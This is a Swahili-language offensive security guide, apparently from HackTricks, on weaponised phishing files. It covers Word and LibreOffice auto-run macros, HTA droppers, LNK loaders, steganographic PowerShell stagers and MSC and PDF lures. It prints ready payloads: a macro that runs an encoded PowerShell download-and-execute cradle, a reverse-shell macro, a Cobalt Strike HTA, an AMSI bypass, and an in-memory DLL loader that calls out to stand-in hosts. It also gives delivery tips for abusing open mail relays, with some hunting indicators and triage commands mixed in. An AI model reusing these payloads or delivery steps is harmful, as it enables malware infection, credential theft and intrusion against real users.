# Faili na Hati za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Hati za Office

Microsoft Word hufanya uthibitishaji wa data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa kutambua muundo wa data kulingana na kiwango cha OfficeOpenXML. Ikiwa kosa lolote litatokea wakati wa kutambua muundo wa data, faili inayochanganuliwa haitafunguliwa.

Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi chake na bado kuhifadhi uwezo wake wa kutekeleza macros.\
Kwa mfano, faili ya RTF haiungi mkono macros kwa muundo wake, lakini faili ya DOCM iliyopewa jina upya kuwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
Mambo haya ya ndani na taratibu hizi zinatumika pia kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).

Unaweza kutumia amri ifuatayo kuangalia viendelezi vitakavyotekelezwa na baadhi ya programu za Office:

```bash
assoc | findstr /i "word excel powerp"
```

Faili za DOCX zinazorejelea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) iliyo na macros pia zinaweza “kutekeleza” macros.

### Kupakia Picha ya Nje

Nenda kwenye: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Kupakia Picha ya Nje: Nenda kwenye: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Mlango wa Nyuma wa Macros

Inawezekana kutumia macros kutekeleza msimbo wowote kutoka kwenye hati.

#### Vitendaji vya Kujipakia

Kadiri vinavyotumiwa mara nyingi, ndivyo AV inavyoweza kuvigundua.

- AutoOpen()
- Document_Open()

#### Mifano ya Msimbo wa Macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ondoa metadata mwenyewe

Nenda kwenye **File > Info > Inspect Document > Inspect Document** ili kufungua Document Inspector. Bofya **Inspect**, kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Kiendelezi cha Doc

Ukimaliza, chagua menyu kunjuzi ya **Save as type**, kisha badilisha umbizo kutoka **`.docx`** hadi Word 97-2003 **`.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro ndani ya `.docx`**, na kuna **unyanyapaa** **unaohusishwa na** kiendelezi **`.docm`** kinachowezesha macro (kwa mfano, ikoni ya thumbnail ina `!` kubwa, na baadhi ya gateway za wavuti/barua pepe huzizuia kabisa). Kwa hiyo, kiendelezi hiki cha zamani cha **`.doc`** ndicho chaguo bora la kati.

#### Zana za Kutengeneza Malicious Macros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros za Basic zinazojiendesha zenyewe kwenye LibreOffice ODT

Nyaraka za LibreOffice Writer zinaweza kupachika macros za Basic na kuzifanya zijitekeleze faili inapofunguliwa kwa kuunganisha macro kwenye tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro rahisi ya reverse shell inaonekana hivi:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Zingatia alama za kunukuu zilizorudiwa (`""`) ndani ya string – LibreOffice Basic huzitumia kuweka alama za kunukuu halisi, kwa hiyo payloads zinazoishia kwa `...==""")` huweka amri ya ndani na argument ya Shell zikiwa na alama zinazolingana.

Vidokezo vya uwasilishaji:

- Hifadhi kama `.odt` na uunganishe macro na tukio la hati ili ianze mara tu hati inapofunguliwa.
- Unapotuma barua pepe kwa kutumia `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili bytes za faili, badala ya mfuatano wa jina la faili, zitumwe kama kiambatisho). Hili ni muhimu unapozitumia vibaya seva za SMTP zinazokubali wapokeaji wowote wa `RCPT TO` bila uthibitishaji.

## Faili za HTA

HTA ni programu ya Windows **inayochanganya HTML na lugha za scripting (kama vile VBScript na JScript)**. Hutengeneza kiolesura cha mtumiaji na kutekelezwa kama programu "inayoaminika kikamilifu", bila vizuizi vya muundo wa usalama wa kivinjari.

HTA hutekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **husakinishwa** pamoja na **Internet Explorer**, hivyo **`mshta` hutegemea IE**. Kwa hiyo, ikiwa imeondolewa, HTA hazitaweza kutekelezwa.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Kadi za viambatisho bandia katika barua pepe ya HTML

Barua pepe ya HTML inaweza kuiga kadi ya onyesho la awali la viambatisho vya mtoa huduma badala ya kuwa na kiambatisho halisi. Talos iliona kadi ya Gmail iliyoundwa upya kutoka sehemu nne za MIME za PNG zilizosimbwa kwa Base64 na kupachikwa ndani. Udhibiti wote wa mwonekano uliwekwa ndani ya anchor moja, na thamani ya mpokeaji katika `?m=<target-id>` iliwezesha ufuatiliaji kwa kila mpokeaji. Kiungo kilianza na `//` badala ya `http://` au `https://`; vivinjari hutatua muundo huo unaotumia itifaki ya ukurasa, lakini zana za kutoa URL zinazolingana tu na URL zilizoainishwa kikamilifu zinaweza kukikosa.<sup>[[11]](#references)</sup>

Wakati wa uchanganuzi, kagua MIME ghafi badala ya kutegemea orodha ya viambatisho inayoonyeshwa. Tambua jinsi sehemu za picha zilizopachikwa ndani zinavyounda kadi ya mwonekano, tambua anchor inayoizunguka, na geuza thamani za `href` zinazotumia itifaki ya ukurasa kuwa URL za kawaida kabla ya kutoa URL.<sup>[[11]](#references)</sup>

Kwa majaribio ya kughushi mtumaji wa envelope/header na upatanishi wa DMARC, angalia [hatua za kujikinga dhidi ya kughushi barua pepe za SMTP](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "kwa mbali"**; kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambayo mtumiaji atafikia (hata HTTP MitM?). Au mtumie mwathiriwa **anwani ya faili** zitakazoanzisha **authentication** kwa **kufungua folda tu.**

**Angalia mawazo haya na mengine katika kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba unaweza si tu kuiba hash au authentication, bali pia **kufanya mashambulizi ya NTLM relay**:

- [**Mashambulizi ya NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads zilizopachikwa kwenye ZIP (mnyororo usiohitaji faili)

Kampeni zenye ufanisi mkubwa husambaza ZIP iliyo na nyaraka mbili halali za kupotosha (PDF/DOCX) na faili hasidi ya .lnk. Mbinu yake ni kwamba PowerShell loader halisi huhifadhiwa ndani ya baiti ghafi za ZIP baada ya alama ya kipekee, na .lnk huitoa na kuiendesha yote kwenye kumbukumbu.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida unaotekelezwa na amri ya mstari mmoja ya PowerShell ndani ya .lnk:

1) Tafuta ZIP ya awali katika maeneo ya kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na folda mama ya saraka ya sasa ya kufanya kazi.
2) Soma baiti za ZIP na utafute alama iliyowekwa moja kwa moja kwenye msimbo (kwa mfano, xFIQCV). Kila kitu baada ya alama hiyo ni PowerShell payload iliyopachikwa.
3) Nakili ZIP hadi %ProgramData%, ifungue hapo, na ufungue .docx ya kupotosha ili ionekane halali.
4) Bypass AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Ondoa obfuscation ya hatua inayofuata (kwa mfano, ondoa herufi zote za #) na uitekeleze kwenye kumbukumbu.

Mfano wa muundo wa msingi wa PowerShell wa kutoa na kuendesha hatua iliyopachikwa:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Maelezo
- Usambazaji mara nyingi hutumia vibaya subdomain za PaaS zinazoheshimika (kwa mfano, *.herokuapp.com) na unaweza kuweka masharti ya kutoa payload (kuhudumia ZIP zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi husimbua shellcode ya base64/XOR na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza alama kwenye diski.

Uendelevu unaotumika katika mnyororo huo huo
- Utekaji wa COM TypeLib wa kidhibiti cha Microsoft Web Browser ili IE/Explorer au programu yoyote inayokijumuisha ikizinduliwa tena, izindue payload kiotomatiki.<sup>[[2]](#references)[[4]](#references)</sup> Tazama maelezo na amri zilizo tayari kutumika hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Uwindaji/IOCs
- Faili za ZIP zenye mfuatano wa alama wa ASCII (kwa mfano, xFIQCV) ulioongezwa mwishoni mwa data ya kumbukumbu.
- Faili ya .lnk inayoorodhesha folda za mzazi/mtumiaji ili kupata ZIP na kufungua hati ya chambo.
- Uchezewaji wa AMSI kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Minyororo mirefu ya barua pepe za kikazi inayoishia na viungo vilivyohifadhiwa kwenye domain za PaaS zinazoaminika.

## LNK: uwekaji wa chambo kwanza → uendelevu wa scheduled task → trusted CPL side-loading

Muundo mwingine unaojirudia ni **`.lnk` inayoiga hati** inayofungua mara moja chambo kisicho na madhara huku ikiandaa mnyororo halisi chinichini.<sup>[[3]](#references)</sup>

Mtiririko wa kazi ulioonekana:
1. Njia ya mkato **inajifanya kuwa PDF** na kutumia `conhost.exe` au proxy inayofanana kuzindua kipakuzi cha PowerShell kilichofichwa.
2. PowerShell hugawa tokeni zilizo wazi (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili utambuzi wa kawaida unaotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` usitambue amri hiyo.
3. Stager hupakua **hati ya chambo kwanza**, huifungua kwa mwathiriwa, kisha huunda upya faili hasidi chinichini.
4. Payload zinaweza kuandikwa kwa **viendelezi vya ovyo** kisha kubadilishwa majina kwa kuondoa herufi za kujazia, na hivyo kuchelewesha kuonekana kwa faili za `.exe` / `.cpl` zilizo wazi.
5. Uendelevu huanzishwa kwa **scheduled task ya kila dakika** inayozindua binary ya host inayoaminika kutoka kwenye njia inayoweza kuandikiwa na mtumiaji.

Vidokezo vya msingi vya uwindaji kutoka kwenye muundo huu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Mpangilio muhimu wa staging wa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` au `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini hatua ya pili ni fiche

Katika case study ya Rapid7, scheduled task ilizindua mara kwa mara **`Fondue.exe`** kutoka `C:\Users\Public\`. Kwa kuwa **`APPWIZ.cpl`** iliwekwa kando yake na kutoa **`RunFODW`**, binary inayoaminika ya Microsoft ilipakia CPL ya mshambuliaji badala ya nakala halali ya mfumo.

CPL hiyo:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Huifungua kwa kutumia **Windows CNG / `bcrypt.dll`**
- Hutenga memory inayoweza kutekelezeka na kunakili shellcode iliyofunguliwa humo
- Huitekeleza kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback ya **`EnumUILanguagesW`**

Hatua hiyo ya mwisho inafaa kuchunguzwa kivyake: malware mara nyingi huepuka kuruka moja kwa moja kwa `((void(*)())buf)()` na badala yake hutumia vibaya **WinAPI halali inayopokea callback** ili kuhamisha utekelezaji.

Payload iliyofunguliwa katika kampeni hii ilikuwa shellcode ya **Donut**, ambayo kisha ilipanga PE ya mwisho kikamilifu kwenye memory na kurekebisha **AMSI/WLDP/ETW** katika mchakato wa sasa kabla ya kukabidhi utekelezaji. Kwa maelezo zaidi kuhusu side-loading na uchakataji wa baadaye unaokaa kwenye memory, tazama:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Viashiria vya vitendo vya kufanya uchunguzi:
- `.lnk` inayozindua `powershell.exe` au `conhost.exe`, kisha kufuatiwa na hati ya chambo inayoonekana.
- Vipakuliwa vya muda mfupi kwenda **`C:\Users\Public\`** vinavyofuatwa mara moja na kubadilishwa majina kutoka viendelezi visivyo na maana.
- Scheduled tasks zenye majina yasiyoashiria chochote, kama `GoogleErrorReport`, zinazoendeshwa kutoka **directories ambazo mtumiaji anaweza kuandikia**.
- Binary zinazoaminika zinazopakia faili za **`.cpl` / `.dll`** kutoka directory ileile isiyo ya mfumo.
- Blob za maandishi za Base64 zinazoandikwa chini ya **`C:\Windows\Tasks\`** na kisha kusomwa na module iliyopakiwa kupitia side-loading.

## Payloads zilizotenganishwa kwa Steganography ndani ya picha (PowerShell stager)

Minyororo ya loader ya hivi karibuni hutoa JavaScript/VBS iliyofichwa ambayo hufungua na kuendesha PowerShell stager ya Base64. Stager hiyo hupakua picha (mara nyingi GIF) iliyo na .NET DLL iliyosimbwa kwa Base64 na kufichwa kama maandishi ya kawaida kati ya alama za kipekee za mwanzo/mwisho. Script hutafuta alama hizo za mipaka (mifano iliyoonekana porini: «<<sudo_png>> … <<sudo_odt>>>»), huchopoa maandishi yaliyomo kati yake, huyafungua kutoka Base64 kuwa bytes, hupakia assembly kwenye memory na kuita entry method inayojulikana pamoja na URL ya C2.<sup>[[5]](#references)</sup>

Mtiririko wa kazi
- Hatua ya 1: JS/VBS dropper iliyohifadhiwa kwenye archive → hufungua Base64 iliyopachikwa → huzindua PowerShell stager kwa kutumia -nop -w hidden -ep bypass.
- Hatua ya 2: PowerShell stager → hupakua picha, huchopoa Base64 iliyotenganishwa kwa alama, hupakia .NET DLL kwenye memory na kuita method yake (kwa mfano, VAI) huku ikipitisha URL ya C2 na chaguo.
- Hatua ya 3: Loader hupakua payload ya mwisho na kwa kawaida huiingiza kupitia process hollowing kwenye binary inayoaminika (mara nyingi MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Tazama zaidi kuhusu process hollowing na utekelezaji wa proxy kupitia zana zinazoaminika hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kuchopoa DLL kutoka kwenye picha na kuita method ya .NET kwenye memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Maelezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Alama hutofautiana kati ya kampeni.
- AMSI/ETW bypass na string deobfuscation hutumika mara nyingi kabla ya kupakia assembly.
- Hunting: changanua picha zilizopakuliwa ili kutafuta delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja kufungua blobs za Base64.

Tazama pia zana za stego na mbinu za carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Hatua ya awali inayojirudia ni faili ndogo ya `.js` au `.vbs` iliyofichwa sana, inayowasilishwa ndani ya archive. Kazi yake pekee ni kufungua mfuatano wa Base64 uliopachikwa na kuwasha PowerShell kwa `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.<sup>[[5]](#references)</sup>

Mantiki ya msingi (muhtasari):
- Soma maudhui ya faili lenyewe
- Tafuta blob ya Base64 kati ya mfuatano wa taka
- Badili kuwa ASCII PowerShell
- Tekeleza kwa `wscript.exe`/`cscript.exe` inayoanzisha `powershell.exe`

Viashiria vya Hunting
- Viambatisho vya JS/VBS vilivyowekwa kwenye archive vinavyoanzisha `powershell.exe` yenye `-enc`/`FromBase64String` kwenye mstari wa amri.
- `wscript.exe` inayoanzisha `powershell.exe -nop -w hidden` kutoka kwenye njia za temp za mtumiaji.

## Nyaraka za MSC kama vyombo vya utekelezaji (GrimResource)

Faili za Microsoft Management Console (`.msc`) ni fasili za console za XML ambazo kwa kawaida hufunguliwa na `mmc.exe`. **GrimResource** hutumia vibaya rejeleo la `StringTable` kwa rasilimali ya `apds.dll` iliyo na primitive ya zamani ya XSS, hivyo mtumiaji akifungua console iliyoundwa mahsusi, JavaScript huendeshwa ndani ya `mmc.exe`. Sampuli zilizochunguzwa zilichanganya obfuscation inayotumia `transformNode` na **DotNetToJScript** ili kuanzisha payload ya .NET bila kutumia njia ya kawaida ya Office macro.<sup>[[9]](#references)</sup>

Kwa static triage, ichukulie MSC isiyoaminika kama maandishi na **usiibofye mara mbili**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Pivoti za runtime zenye ishara nyingi ni `mmc.exe` kupakia CLR au vipengele vya script, kuunda miunganisho ya mtandao, au kuwasha `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe`, au executable isiyotarajiwa. Muundo huu ni halali, kwa hivyo detections zinapaswa kuhusisha **chanzo + maudhui ya XML/script yanayotia shaka + tabia ya `mmc.exe`** badala ya kuzuia kila MSC.<sup>[[9]](#references)</sup>

## PDF/QR zinazoelekeza upya na udhibiti wa payload

PDF haihitaji exploit ili iwe na manufaa. Kampeni za hivi karibuni huweka **QR code au kiungo cha kawaida** kwenye hati inayoonekana halali, huhamisha session ya browser mbali na vidhibiti vya barua pepe, na kubinafsisha mahali inapoelekeza kwa kutumia anwani ya mpokeaji. Microsoft ilirekodi PDF za 2025 ambazo URL za QR zilikuwa za kipekee kwa kila mpokeaji na zilielekeza kwenye miundombinu ya kukusanya credentials ya RaccoonO365; mnyororo sambamba ulitumia udhibiti wa ufikiaji kwa IP/mazingira ili kuwasilisha njia ya JavaScript/MSI kwa wageni waliochaguliwa, lakini PDF isiyo na madhara kwa scanners au clients wasioruhusiwa.<sup>[[10]](#references)</sup>

Chunguza vitendo vya PDF na QR codes zilizorenderiwa. QR inaweza kuchorwa kwa vekta badala ya kuhifadhiwa kama picha inayoweza kutolewa, kwa hivyo rasterize kila ukurasa na pia utoe picha zilizopachikwa:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Kagua maeneo lengwa yaliyofichuliwa na uelekezaji upya kutoka kwenye mfumo wa uchanganuzi uliotengwa bila kuthibitisha utambulisho. Vipengele muhimu vya kutafuta ni pamoja na PDF zilizo na QR pekee na barua pepe zenye maudhui machache sana, anwani ya barua pepe ya mpokeaji iliyowekwa kwenye kigezo cha query, uelekezaji upya kadhaa kupitia huduma za hosting zinazoaminika, na maudhui tofauti yanayorudishwa kulingana na IP, eneo la kijiografia, cookies, referrer, au user agent. Linganisha maombi kwa kutumia wasifu unaodhibitiwa, kwa sababu ombi moja la sandbox linaweza kupokea chambo pekee.<sup>[[10]](#references)</sup>

## Faili za Windows za kuiba NTLM hashes

Angalia ukurasa kuhusu **maeneo ya kuiba NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro ya LibreOffice → webshell ya IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Utafiti wa Check Point – Kampeni ya ZipLine: Shambulio changamano la phishing linalolenga kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Kufuatilia mbinu za Dropping Elephant kupitia msururu wa loader wenye mandhari ya China](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Tekeleza utekaji wa TypeLib – Mbinu mpya ya COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader husambaza aina mbalimbali za infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Utekelezaji wa wakala kupitia zana za msanidi zinazoaminika: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console kwa ufikiaji wa awali na ukwepaji](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Blogu ya Usalama ya Microsoft – Watendaji wa vitisho hutumia msimu wa kodi kusambaza kampeni za phishing zenye mada ya kodi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Msururu wa usambazaji wa UAT-11587 na backdoor ya Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
